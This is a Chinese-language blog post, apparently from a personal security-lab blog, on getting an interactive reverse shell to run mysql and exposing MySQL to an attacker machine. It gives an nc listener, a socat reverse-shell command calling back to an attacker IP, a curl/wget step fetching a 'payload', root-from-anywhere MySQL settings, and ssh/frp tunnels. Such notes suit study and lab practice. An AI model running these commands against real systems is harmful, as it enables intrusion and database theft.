@@ -1,0 +1,224 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>反弹shell远程链接mysql数据库的问题 | Ice0lng的blog</title><meta name="author" content="Ice0lng"><meta name="copyright" content="Ice0lng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="直接使用一个不完全交互的反弹shell链接mysql会怎么样呢？  kali接受的内容如下： 12345678┌──(root?kali)-[&#x2F;home&#x2F;kali]└─# nc -lnvp 4444 Ncat: Version 7.93 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:444">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell远程链接mysql数据库的问题">
+<meta property="og:url" content="http://example.com/2023/03/24/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/index.html">
+<meta property="og:site_name" content="Ice0lng的blog">
+<meta property="og:description" content="直接使用一个不完全交互的反弹shell链接mysql会怎么样呢？  kali接受的内容如下： 12345678┌──(root?kali)-[&#x2F;home&#x2F;kali]└─# nc -lnvp 4444 Ncat: Version 7.93 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:444">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/Maple.jfif">
+<meta property="article:published_time" content="2023-03-24T03:12:34.000Z">
+<meta property="article:modified_time" content="2023-03-24T03:53:57.359Z">
+<meta property="article:author" content="Ice0lng">
+<meta property="article:tag" content="关于shell和mysql的一些问题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/Maple.jfif"><link rel="shortcut icon" href="/img/favicon/favicon.ico"><link rel="canonical" href="http://example.com/2023/03/24/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '反弹shell远程链接mysql数据库的问题',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-24 11:53:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/font.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/Maple.jfif" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Ice0lng的blog"><span class="site-name">Ice0lng的blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">反弹shell远程链接mysql数据库的问题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-24T03:12:34.000Z" title="发表于 2023-03-24 11:12:34">2023-03-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-24T03:53:57.359Z" title="更新于 2023-03-24 11:53:57">2023-03-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">690</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="反弹shell远程链接mysql数据库的问题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>直接使用一个不完全交互的反弹shell链接mysql会怎么样呢？</p>
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/image-20230324110953810.png" alt="image-20230324110953810"></p>
+<p>kali接受的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root?kali)-[/home/kali]</span><br><span class="line">└─# nc -lnvp 4444 </span><br><span class="line">Ncat: Version 7.93 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 192.168.100.200.</span><br><span class="line">Ncat: Connection from 192.168.100.200:43880.</span><br><span class="line">root@ubuntu20:~# 	</span><br></pre></td></tr></table></figure>
+
+<p>使用反弹shell直接链接数据库，</p>
+<p> <img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/image-20230324102044498.png" alt="image-20230324102044498"></p>
+<p>会发现shell会直接卡在这里不动了。这时候我们需要一个完全交互的shell</p>
+<h3 id="建立完全交互式的shell"><a href="#建立完全交互式的shell" class="headerlink" title="建立完全交互式的shell"></a>建立完全交互式的shell</h3><h4 id="使用python-pty"><a href="#使用python-pty" class="headerlink" title="使用python pty"></a>使用python pty</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/Image.png" alt="Image"></p>
+<p>可以一开始时，就创建一个完全交互的shell</p>
+<h4 id="使用socat建立完全交互的shell"><a href="#使用socat建立完全交互的shell" class="headerlink" title="使用socat建立完全交互的shell"></a>使用socat建立完全交互的shell</h4><p>攻击机开启监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
+
+<p>使用当前会话的tty终端来作为数据源，使用原始模式（raw）传输数据，不进行回显（echo&#x3D;0）；</p>
+<p>靶机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.184.150:4444</span><br></pre></td></tr></table></figure>
+
+<p>exec:’bash -li’：表示在 socat 的连接中使用 bash 进程来执行命令。li 表示使用登录 shell;</p>
+<p>pty：表示使用伪终端;</p>
+<p>stderr：表示将标准错误输出转发到连接中;</p>
+<p>setsid：使得 socat 执行的进程在新 session 中运行，这样可以避免某些信号被 socat 中止;</p>
+<p>sigint：将 SIGINT 信号发送到 bash 进程；</p>
+<p>sane：将终端设置为“基本模式”（普通终端）；</p>
+<p>连接结果如下：</p>
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/image-20230324112644649.png" alt="image-20230324112644649"></p>
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/Image-1679629863524-1.png" alt="Image"></p>
+<p>除了使用shell链接以外，我们还可以使用端口转发，这需要我们能够远程连接mysql，那么</p>
+<h3 id="mysql远程访问配置："><a href="#mysql远程访问配置：" class="headerlink" title="mysql远程访问配置："></a><strong>mysql远程访问配置：</strong></h3><p>①mysql 8.0以后需要修改 mysqld.cnf 数据库配置</p>
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/clip_image002.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/mysql/mysql.conf.d# vim mysqld.cnf</span><br></pre></td></tr></table></figure>
+
+<p>注释下面两条 127.0.0.1的配置，或者将其修改为0.0.0.0</p>
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/clip_image003.png" alt="img"></p>
+<p>②修改mysql中的mysql库的user表</p>
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/clip_image007.png" alt="img"></p>
+<p>将上面的User为root的Host修改为%，则可以让mysql的root在任意位置上登陆。</p>
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/clip_image009.png" alt="img"></p>
+<p>最后mysql中执行：flush privileges;</p>
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/clip_image010.png" alt="img"></p>
+<h3 id="做端口转发"><a href="#做端口转发" class="headerlink" title="做端口转发"></a>做端口转发</h3><p>（需要能够远程访问）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu20:~# ssh -NR 13306:localhost:3306 192.168.100.70</span><br><span class="line">root@192.168.100.70&#x27;s password: </span><br></pre></td></tr></table></figure>
+
+<p>这里使用frps：</p>
+<p>攻击机：配置 frps 和 frps.ini</p>
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/clip_image012.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000     #和frp客户端通信的端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/clip_image014.png" alt="img"></p>
+<p>受控机：可以通过 curl <a href="http://ip:port/payload">http://ip:port/payload</a>  -o file ; wget等方式从攻击机上下载frpc.ini和frpc，并且提前配置好frpc.ini文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.100.70     	#frp服务端</span><br><span class="line">server_port = 7000           		#frp自己的通信端口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[web]                 			#服务名，名字可以随便起</span><br><span class="line">type = tcp               		#传输协议</span><br><span class="line">local_ip = 192.168.100.200		#要转发的ip</span><br><span class="line">local_port = 80            		#要转发的端口</span><br><span class="line">remote_port = 1080			#映射到frp服务端的端口</span><br><span class="line"> </span><br><span class="line">[mysql]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3306</span><br><span class="line">remote_port = 13306</span><br></pre></td></tr></table></figure>
+
+<p>这里我们只是转发mysql的就可以了，[web]那块可以不需要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x frpc</span><br><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/clip_image016.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -P port -uroot -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/clip_image018.png" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Ice0lng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/24/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/">http://example.com/2023/03/24/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Ice0lng的blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%85%B3%E4%BA%8Eshell%E5%92%8Cmysql%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/">关于shell和mysql的一些问题</a></div><div class="post_share"><div class="social-share" data-image="/img/Maple.jfif" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/03/22/%5BhxpCTF2023%5Dvalentine%E5%A4%8D%E7%8E%B0/" title="hxpCTF 2023 valentine复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">hxpCTF 2023 valentine复现</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/Maple.jfif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ice0lng</div><div class="author-info__description">不一于汝，而二于物</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ice0lng"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E5%AE%8C%E5%85%A8%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%9A%84shell"><span class="toc-number">1.</span> <span class="toc-text">建立完全交互式的shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8python-pty"><span class="toc-number">1.1.</span> <span class="toc-text">使用python pty</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8socat%E5%BB%BA%E7%AB%8B%E5%AE%8C%E5%85%A8%E4%BA%A4%E4%BA%92%E7%9A%84shell"><span class="toc-number">1.2.</span> <span class="toc-text">使用socat建立完全交互的shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">mysql远程访问配置：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">3.</span> <span class="toc-text">做端口转发</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/24/shell%E4%B8%8Emysql%E9%93%BE%E6%8E%A5/" title="反弹shell远程链接mysql数据库的问题">反弹shell远程链接mysql数据库的问题</a><time datetime="2023-03-24T03:12:34.000Z" title="发表于 2023-03-24 11:12:34">2023-03-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/22/%5BhxpCTF2023%5Dvalentine%E5%A4%8D%E7%8E%B0/" title="hxpCTF 2023 valentine复现">hxpCTF 2023 valentine复现</a><time datetime="2023-03-22T10:02:11.000Z" title="发表于 2023-03-22 18:02:11">2023-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/04/The-test/" title="The test">The test</a><time datetime="2023-03-04T14:13:11.000Z" title="发表于 2023-03-04 22:13:11">2023-03-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ice0lng</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
